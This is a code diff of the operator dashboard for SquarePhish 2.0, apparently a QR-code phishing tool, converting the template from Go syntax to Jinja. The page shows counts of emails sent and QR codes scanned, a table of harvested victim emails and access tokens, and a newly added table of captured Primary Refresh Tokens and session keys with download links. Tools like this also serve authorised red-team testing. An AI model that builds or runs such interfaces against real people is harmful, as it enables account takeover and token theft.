@@ -1,14 +1,15 @@
-{{ define "body" }}
+{% extends "base.html" %}
+{% block body %}
             <div class="d-flex justify-content-center flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                 <h1 class="h2">SquarePhish 2.0</h1>
             </div>
-    
+
             <div class="row">
                 <div class="col-md-6 mb-6">
                     <div class="card text-center shadow-sm">
                         <div class="card-body">
                             <h5 class="card-title text-muted">Emails Sent</h5>
-                            <p class="card-text metric-value">{{ .EmailsSent }}</p>
+                            <p class="card-text metric-value">{{ emails_sent }}</p>
                         </div>
                     </div>
                 </div>
@@ -16,15 +17,25 @@
                     <div class="card text-center shadow-sm">
                         <div class="card-body">
                             <h5 class="card-title text-muted">QR Codes Scanned</h5>
-                            <p class="card-text metric-value">{{ .EmailsScanned }}</p>
+                            <p class="card-text metric-value">{{ emails_scanned }}</p>
                         </div>
                     </div>
                 </div>
             </div>
+            <div class="mt-2 text-end">
+                <button class="btn btn-sm btn-outline-danger clear-btn" data-url="/clear/stats">
+                    <i class="bi bi-trash me-1"></i>Clear Stats
+                </button>
+            </div>
 
             <!-- Credentials Table -->
             <div class="mt-4">
-                <h3>Credentials</h3>
+                <div class="d-flex justify-content-between align-items-center">
+                    <h3>Credentials</h3>
+                    <button class="btn btn-sm btn-outline-danger clear-btn" data-url="/clear/credentials">
+                        <i class="bi bi-trash me-1"></i>Clear
+                    </button>
+                </div>
                 <table class="table table-striped">
                     <thead>
                         <tr>
@@ -34,19 +45,64 @@
                         </tr>
                     </thead>
                     <tbody>
-                        {{ range .Credentials }}
+                        {% for cred in credentials %}
                         <tr>
-                            <td>{{ .Email }}</td>
-                            <td>{{ if gt (len .Token.AccessToken) 20 }}{{ printf "%.20s..." .Token.AccessToken }}{{ else }}{{ .Token.AccessToken }}{{ end }}</td>
-                            <td><a href="/token?email={{ .Email }}" target="_blank">View</a></td>
+                            <td>{{ cred.email }}</td>
+                            <td>{% if cred.token.access_token|length > 20 %}{{ cred.token.access_token[:20] }}...{% else %}{{ cred.token.access_token }}{% endif %}</td>
+                            <td><a href="/token?email={{ cred.email }}" target="_blank">View</a></td>
                         </tr>
-                        {{ end }}
+                        {% endfor %}
                     </tbody>
                 </table>
             </div>
+
+            {% if prt_results %}
+            <!-- PRT Tokens Table -->
+            <div class="mt-4">
+                <div class="d-flex justify-content-between align-items-center">
+                    <h3>Primary Refresh Tokens</h3>
+                    <button class="btn btn-sm btn-outline-danger clear-btn" data-url="/clear/prts">
+                        <i class="bi bi-trash me-1"></i>Clear
+                    </button>
+                </div>
+                <table class="table table-striped">
+                    <thead>
+                        <tr>
+                            <th>Email</th>
+                            <th>PRT</th>
+                            <th>Session Key</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for prt in prt_results %}
+                        <tr>
+                            <td>{{ prt.email }}</td>
+                            <td>{% if prt.prt|length > 20 %}{{ prt.prt[:20] }}...{% else %}{{ prt.prt }}{% endif %}</td>
+                            <td>{% if prt.session_key|length > 20 %}{{ prt.session_key[:20] }}...{% else %}{{ prt.session_key }}{% endif %}</td>
+                            <td><a href="/prt?email={{ prt.email }}" target="_blank">View</a> | <a href="/prt/download?email={{ prt.email }}">Download</a></td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+            {% endif %}
 
             <br/><br/>
             <div class="mt-4 p-4 bg-body-secondary rounded">
                 <p align="center">Visit <a target="_blank" href="https://github.com/nromsdahl/squarephish2">SquarePhish2</a> to learn more.</p>
             </div>
-{{ end }}{{ define "scripts" }}{{ end }}
+{% endblock %}
+{% block scripts %}
+        <script>
+            document.querySelectorAll('.clear-btn').forEach(btn => {
+                btn.addEventListener('click', function () {
+                    if (!confirm('Are you sure?')) return;
+                    fetch(this.dataset.url, { method: 'POST' })
+                        .then(r => {
+                            if (r.ok) location.reload();
+                        });
+                });
+            });
+        </script>
+{% endblock %}
